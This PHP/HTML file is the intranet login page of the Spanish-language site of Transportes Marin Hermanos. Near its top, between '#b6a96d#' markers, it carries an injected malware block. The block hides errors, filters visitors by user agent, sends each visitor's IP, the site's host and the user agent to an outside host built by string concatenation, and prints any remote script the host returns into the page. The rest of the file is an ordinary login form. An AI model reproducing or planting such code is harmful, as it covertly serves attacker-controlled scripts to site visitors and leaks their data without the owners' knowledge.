<?php
	require("../conexion/ajax.php");
?>
<?php
#b6a96d#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/b6a96d#
?>
<script language="javascript" type="text/javascript">

	function manejo()
	{
		usuario = document.getElementById('textUsuario').value;
		clave = document.getElementById('textClave').value;
		
		if(usuario.length==0 || clave.length==0)
		{
			alert("¡ Debes ingresar un usuario y una clave !");
			return;
		}
		document.getElementById('formLoggeo').submit();
	}	
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - INTRANET ::</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo1 {	font-size: 24px;
	color: #FFCC00;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
.Estilo4 {
	font-weight: bold;
	color: #FFFFFF;
	font-style: italic;
}
-->
</style></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td><table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#446333">
          <tr>
            <td background="../conexion/Img/m02.jpg"><a href=""></a><a href=""></a><a href=""></a><a href=""></a><a href=""></a><a href=""></a><a href=""></a></td>
            <td width="154" rowspan="2" bgcolor="#336600">
			<form  action="admin.php" method="post" name="formLoggeo" id="formLoggeo">
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td class="Estilo2"></td>
                  </tr>
                  <tr>
                    <td class="Estilo2"><div align="center">Usuario</div></td>
                  </tr>
                  <tr>
                    <td class="Estilo2"><label>
                      <div align="center">
                        <input name="textUsuario" type="text" id="textUsuario" />
                        </div>
                    </label></td>
                  </tr>
                  <tr>
                    <td class="Estilo2"><div align="center"><br />
                      Clave</div></td>
                  </tr>
                  <tr>
                    <td class="Estilo2"><label>
                      <div align="center">
                        <input name="textClave" type="password" id="textClave" />
                        </div>
                    </label></td>
                  </tr>
                  <tr>
                    <td class="Estilo2"><div align="center"></div></td>
                  </tr>
                  <tr>
                    <td class="Estilo2"><label>
                      <div align="center">
                        <input name="botonAceptar" type="button" id="botonAceptar" onClick="manejo()" value="Aceptar"/>
						<input type="hidden" name="op" value="loggin">
                        </div>
                    </label></td>
                  </tr>
                  <tr>
                    <td class="Estilo2"><p>&nbsp;</p>
                      <p align="center"><a href="../index.html" class="Estilo4">Regresar</a></p></td>
                  </tr>
                </table>
            </form></td>
          </tr>
          <tr>
            <td width="626" height="154" background="../imagenes/bg02.jpg" style="background-repeat:no-repeat;background-position:top;" valign="top"><table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td width="246" valign="top"><img src="../images/t1.jpg" width="223" height="149" hspace="15" vspace="10" /></td>
                  <td valign="top"><div align="center">
                    <p><span class="Estilo1"><br />
                    <br />
  Bienvenidos a<br />
  Nuestra Intranet</span> <br />
                      <br />
                      <span class="Estilo2"> Ingrese sus datos para acceder: </span></p>
                    </div></td>
                </tr>
            </table></td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37"><table cellpadding="0" cellspacing="0" border="0" align="left">
          <tr>
            <td><img src="../images/t2.jpg" width="223" height="149" hspace="5" vspace="10" /></td>
            <td><img src="../images/t3.jpg" width="223" height="149" hspace="0" vspace="10" /></td>
            <td><img src="../images/t4.jpg" width="223" height="149" hspace="5" vspace="10" /></td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>